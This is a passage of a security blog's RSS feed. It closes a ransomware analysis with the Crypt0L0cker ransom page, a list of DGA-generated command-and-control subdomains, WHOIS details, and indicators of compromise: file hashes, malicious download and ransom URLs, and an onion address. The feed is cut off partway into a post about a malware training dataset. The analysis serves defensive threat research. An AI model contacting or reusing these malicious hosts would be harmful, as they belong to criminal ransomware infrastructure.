/&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure11: Decoding Functions&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;The real behavior is hidden into the Etymology.Vs encrypted file included in the PiMP solution as well. Running the infected sample it disclosures its real behavior: shown in Figure12.&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-92je39ZYjc8/WJ8-tbJnTYI/AAAAAAAAN1o/ehFqESmEYj02mcGsuGCXWlKHPmdnBWscgCLcB/s1600/Schermata%2B2017-02-11%2Balle%2B12.22.49.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;156&#34; src=&#34;https://1.bp.blogspot.com/-92je39ZYjc8/WJ8-tbJnTYI/AAAAAAAAN1o/ehFqESmEYj02mcGsuGCXWlKHPmdnBWscgCLcB/s400/Schermata%2B2017-02-11%2Balle%2B12.22.49.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure12: Ransom Request&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;Here we go, &amp;nbsp;we have just discovered a brand new &lt;b&gt;Crypt0L0cker&lt;/b&gt; ! it asks for bitcoin (Figure13), of course. &amp;nbsp;Looking at network communications, a &lt;b&gt;Domain Name Generator Algorithm&lt;/b&gt;&amp;nbsp;(DNGA), [wow, it sounds new from CryptoL0Cker !] fires up as soon as the dropped file is executed. It looks for valid registered subdomains belonging with &lt;b&gt;divamind.org&lt;/b&gt;. &amp;nbsp;Until a valid Command and Control answers to the CryptoLocker client it hides itself and performs simple DNS query as follows:&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;28&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; imadyxaro.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;29&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; irel.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;30&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; awwtodufir.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;31&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ogisirigu.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;32&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; yzijyvy.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;33&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; uqekfr.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;34&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ydoc.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;35&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; yzukyfyku.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;36&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; upenigy.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;37&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; qhera.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;38&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ijywiqezy.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;39&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; efuca.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;40&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ygbm.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;41&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ejrdip.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;42&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; usen.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;43&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ahydenuj.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;44&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ghxsykegaja.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;45&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ekohob.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;46&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ifyvas.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;47&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; iqimub.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;48&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; usegi.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;49&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; yjeqicoht.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;50&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; rtibola.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;51&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ucnpive.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;52&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; aminevkjude.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;53&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; pwiregaty.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;54&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; irol.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;55&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; abswuhupnt.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;56&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; erelo.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;57&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ulefuw.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;58&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ogax.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;59&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ezelilijxn.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;60&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ulymobutol.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;61&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; obehilebac.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;62&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; yfycodolul.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;63&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; iwesvxynd.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;64&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; kcoma.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;65&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ydqpibc.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;66&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ykotifehut.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;67&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ewuzivy.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;68&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; imocyfyt.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;69&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; fjep.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;70&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ibeb.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;71&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; isafexuh.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;72&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; izemireli.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;73&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; kgorihukyho.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;74&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; udupose.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;    &lt;style type=&#34;text/css&#34;&gt;p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px &#39;Andale Mono&#39;; color: #28fe14; background-color: #000000; background-color: rgba(0, 0, 0, 0.9)} span.s1 {font-variant-ligatures: no-common-ligatures; color: #ecec15} span.s2 {font-variant-ligatures: no-common-ligatures} &lt;/style&gt;                                                 &lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;nbsp;75&amp;nbsp;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; iqyk.divamind.org&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: left;&#34;&gt;The process to contact the Command and Control in order to exchange key and to notify the attacker could be very time consuming, in some of my runs it took until 2 hours depending on the available Command and Control at the time being. It would be very nice to have extra time to reverse the DNGA but unfortunately my weekend time is ending up.&amp;nbsp;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: left;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: left;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-DJmEHNkSIT0/WJ8-l8WnKvI/AAAAAAAAN1k/YzemRChajEgKPmVsw3wr3eWpXQ2ees81gCLcB/s1600/Schermata%2B2017-02-11%2Balle%2B16.11.16.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;302&#34; src=&#34;https://4.bp.blogspot.com/-DJmEHNkSIT0/WJ8-l8WnKvI/AAAAAAAAN1k/YzemRChajEgKPmVsw3wr3eWpXQ2ees81gCLcB/s400/Schermata%2B2017-02-11%2Balle%2B16.11.16.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure13: Ransom Request Web Page&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;Development language is French, and many piece of code reminds me the &#34;gaming world&#34;. &amp;nbsp; The main Command and Control domain is registered in Moscow (RU) and the registrant is &#34;privacy protected&#34;.&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;whoisHeaders&#34; style=&#34;background-color: white; border-bottom: 1px solid rgb(213, 213, 213); float: left; font-family: open_sans, sans-serif; font-size: 13px; font-weight: bold; margin: 5px 30px 5px 5px; padding: 5px; position: relative; width: 436.5px;&#34;&gt;Results for Target: divamind.org&lt;/div&gt;&lt;div style=&#34;background-color: white; clear: both; color: #666666; font-family: open_sans, sans-serif; font-size: 12px;&#34;&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;whoisDataContainer&#34; id=&#34;whoisDates&#34; style=&#34;background-color: white; color: #666666; float: left; font-family: open_sans, sans-serif; font-size: 12px; margin: 0px 30px 5px 5px; padding: 5px; position: relative; width: 436.5px;&#34;&gt;&lt;table border=&#34;0&#34; cellpadding=&#34;2&#34; cellspacing=&#34;0&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34; width=&#34;120&#34;&gt;&lt;strong&gt;Created Date :&lt;/strong&gt;&lt;/td&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34;&gt;2017-02-07T12:37:10Z&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34; width=&#34;120&#34;&gt;&lt;strong&gt;Updated Date :&lt;/strong&gt;&lt;/td&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34;&gt;2017-02-08T10:38:54Z&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34;&gt;&lt;strong&gt;WHOIS Server:&lt;/strong&gt;&lt;/td&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34;&gt;whois.pir.org&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class=&#34;whoisHeaders&#34; style=&#34;background-color: white; border-bottom: 1px solid rgb(213, 213, 213); float: left; font-family: open_sans, sans-serif; font-size: 13px; font-weight: bold; margin: 5px 30px 5px 5px; padding: 5px; position: relative; width: 436.5px;&#34;&gt;Results for Target: divamind.org&lt;/div&gt;&lt;div style=&#34;background-color: white; clear: both; color: #666666; font-family: open_sans, sans-serif; font-size: 12px;&#34;&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;whoisDataContainer&#34; id=&#34;whoisDates&#34; style=&#34;background-color: white; color: #666666; float: left; font-family: open_sans, sans-serif; font-size: 12px; margin: 0px 30px 5px 5px; padding: 5px; position: relative; width: 436.5px;&#34;&gt;&lt;table border=&#34;0&#34; cellpadding=&#34;2&#34; cellspacing=&#34;0&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34; width=&#34;120&#34;&gt;&lt;strong&gt;Created Date :&lt;/strong&gt;&lt;/td&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34;&gt;2017-02-07T12:37:10Z&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34; width=&#34;120&#34;&gt;&lt;strong&gt;Updated Date :&lt;/strong&gt;&lt;/td&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34;&gt;2017-02-08T10:38:54Z&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34;&gt;&lt;strong&gt;WHOIS Server:&lt;/strong&gt;&lt;/td&gt;&lt;td style=&#34;font-family: &amp;quot;Trebuchet MS&amp;quot;, sans-serif; font-size: 12px; line-height: 16.2px; margin-top: 0px;&#34;&gt;whois.pir.org&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;The ransom page (available on the following link) is registered by EPAG Domain Sercives GmbH (Bonn, Germany) and is written in Franc language:&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;http://x5sbb5gesp6kzwsh.hoptrop.pl/uum2j9ku.php?user_code=&lt;code&gt;&amp;amp;user_pass=&lt;pass_code&gt;&amp;amp;page_id=0&lt;/pass_code&gt;&lt;/code&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;b&gt;Ok Let&#39;s have some brand new IoC:&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;b&gt;Malicious hashes:&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;2649cba6ca799e15c45fa59472031cc9087a5ade&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;6ef0e56b27cfd3173aeded9be9d05e97d8e36da3&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;7292f20a0909f5f9429d5c1ec2896cf8f57a40a2&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;0b7b7201310638a74dba763c228d8afe77303802&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;2d36b1bf1c37d6f5b47fe36bd2c5bac81b517774&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;b&gt;Malicious urls:&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;http://mit.fileserver4390.org/file/nost.bg &lt;br /&gt;http://x5sbb5gesp6kzwsh.hoptrop.pl&lt;br /&gt;http://xiodc6dmizahhijj.onion&lt;br /&gt;&lt;br /&gt;&lt;b&gt;DNGA:&lt;/b&gt;&lt;br /&gt;- base dns: XXXXXXX.divamind.org&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Extension:&lt;/b&gt;&lt;br /&gt;.?????? (6 characters)&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Strings:&lt;/b&gt;&lt;br /&gt;HOW_TO_RESTORE_FILES&lt;br /&gt;&lt;br /&gt;Enjoy your new IoC&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Malware Training Sets: A machine learning dataset for everyone</title>
      <link>http://marcoramilli.com/post/malware-training-sets-a-machine-learning-dataset-for-everyone/</link>
      <pubDate>Thu, 15 Dec 2016 23:10:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/malware-training-sets-a-machine-learning-dataset-for-everyone/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;One of the most challenging tasks during Machine Learning processing is to define a great training (and possible dynamic) dataset. Assuming a well known learning algorithm and a periodic learning supervised process what you need is a classified dataset to best train your machine. Thousands of training datasets are available out there from &#34;flowers&#34; to &#34;dices&#34; passing through &#34;genetics&#34;, but I was not able to find a great classified dataset for malware analyses. So, I decided to do it by myself and to share the dataset with the scientific community (and everybody interested on it) in order to give to everyone a base point to start with Machine Learning for Malware Analysis. The first challenge I faced was to define features and how to extract them. &amp;nbsp;Basically I had two choices:&lt;/div&gt;&lt;ol style=&#34;text-align: left;&#34;&gt;&lt;li style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Extracting features directly from samples&lt;/b&gt;. This is the easiest solution since the possible extracted features would be directly related to the sample such as (but not 